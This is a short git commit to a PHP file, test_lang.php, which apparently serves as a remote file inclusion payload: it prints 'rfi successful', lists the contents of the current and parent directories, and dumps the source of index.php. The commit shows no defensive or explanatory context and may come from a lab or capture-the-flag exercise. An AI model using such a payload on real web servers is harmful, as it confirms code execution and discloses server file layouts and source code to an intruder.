9552c3d81d1796dd277bf980f10610eb2a17dda3
overcookedTomato <yacine.saoudi@protonmail.com>
2018-03-04 15:48:04 +0100

    listing files

--- test_lang.php
+++ test_lang.php
@@ -1,4 +1,12 @@
 <?php 
-echo "Hello world!";
+echo "rfi successful";
+
+$files = scandir('.'); 
+ print_r($files);
+
+$files2 = scandir('../'); 
+ print_r($files2);
+
+
 echo file_get_contents( "index.php" );
 ?>
